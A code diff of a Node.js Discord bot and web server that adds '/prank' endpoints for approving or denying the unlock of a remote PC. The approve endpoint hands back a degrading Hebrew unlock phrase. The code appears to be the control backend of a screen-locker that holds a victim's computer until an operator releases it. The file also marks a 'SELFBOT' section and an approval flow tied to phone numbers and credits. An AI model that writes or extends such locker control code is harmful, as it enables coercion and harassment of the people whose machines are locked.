@@ -27,14 +27,13 @@ const CREDITS_COOLDOWN_MS = 24 * 60 * 60 * 1000;
 
 const pendingRequests = new Map();
 const cooldowns = new Map();
+const prankRequests = new Map();
 
-// ===== כל המאשרים =====
 function getAllApprovers() {
     const set = new Set([OWNER_ID, ...APPROVER_IDS]);
     return [...set];
 }
 
-// ===== בדיקה אם משתמש הוא מאשר =====
 function isApprover(userId) {
     return userId === OWNER_ID || APPROVER_IDS.includes(userId);
 }
@@ -116,6 +115,29 @@ function isValidMinute(minute) {
 const app = express();
 app.get('/', (req, res) => res.send('OK'));
 app.get('/health', (req, res) => res.send('OK'));
+
+// ========== PRANK ENDPOINTS ==========
+app.get('/prank/status', (req, res) => {
+    const id = req.query.id;
+    if (!id) return res.json({ status: 'error' });
+    const status = prankRequests.get(id) || { status: 'pending' };
+    res.json(status);
+});
+
+app.get('/prank/approve', (req, res) => {
+    const id = req.query.id;
+    if (!id) return res.send('Missing ID');
+    prankRequests.set(id, { status: 'approved', code: 'אני זונה של ZENO' });
+    res.send('<html><head><meta charset="UTF-8"><title>Approved</title></head><body style="background:#0a0a0a;color:#43b581;font-family:Arial;text-align:center;padding:100px"><h1>✅ Approved</h1><p>The PC will unlock now.</p></body></html>');
+});
+
+app.get('/prank/deny', (req, res) => {
+    const id = req.query.id;
+    if (!id) return res.send('Missing ID');
+    prankRequests.set(id, { status: 'denied' });
+    res.send('<html><head><meta charset="UTF-8"><title>Denied</title></head><body style="background:#0a0a0a;color:#ed4245;font-family:Arial;text-align:center;padding:100px"><h1>❌ Denied</h1><p>The PC will remain locked.</p></body></html>');
+});
+
 app.listen(PORT, () => console.log(`[+] HTTP server running on port ${PORT}`));
 
 // ========== SELFBOT ==========
@@ -1020,7 +1042,6 @@ bot.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ===== אישור =====
     if (interaction.isButton() && interaction.customId.startsWith('approve_')) {
         if (!isApprover(interaction.user.id)) {
             await interaction.reply({ content: '❌ אין לך הרשאה לאשר', ephemeral: true });
@@ -1044,7 +1065,6 @@ bot.on('interactionCreate', async (interaction) => {
             components: []
         });
 
-        // מעדכן את שאר המאשרים
         for (const om of request.ownerMessages || []) {
             if (om.userId === interaction.user.id) continue;
             try {
@@ -1124,7 +1144,6 @@ bot.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ===== דחייה =====
     if (interaction.isButton() && interaction.customId.startsWith('deny_')) {
         if (!isApprover(interaction.user.id)) {
             await interaction.reply({ content: '❌ אין לך הרשאה לדחות', ephemeral: true });
@@ -1148,7 +1167,6 @@ bot.on('interactionCreate', async (interaction) => {
             components: []
         });
 
-        // מעדכן את שאר המאשרים
         for (const om of request.ownerMessages || []) {
             if (om.userId === interaction.user.id) continue;
             try {
@@ -1174,7 +1192,6 @@ bot.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ===== בטל בקשה =====
     if (interaction.isButton() && interaction.customId.startsWith('cancel_request_')) {
         const requestId = interaction.customId.substring(15);
         const request = pendingRequests.get(requestId);
@@ -1213,7 +1230,6 @@ bot.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ========== בקשת אישור ==========
 async function requestApproval(userInteraction, phone, credits, scheduled, id, hour = null, minute = null) {
     const requestId = Date.now().toString() + Math.random().toString(36).substring(2, 8);
 
@@ -1267,7 +1283,6 @@ async function requestApproval(userInteraction, phone, credits, scheduled, id, h
                     .setStyle(ButtonStyle.Danger)
             );
 
-        // שולח לכל המאשרים
         for (const approverId of approvers) {
             try {
                 const approver = await bot.users.fetch(approverId);
@@ -1278,7 +1293,6 @@ async function requestApproval(userInteraction, phone, credits, scheduled, id, h
             }
         }
 
-        // Timeout
         request.ownerTimeout = setTimeout(async () => {
             const stillPending = pendingRequests.get(requestId);
             if (stillPending) {
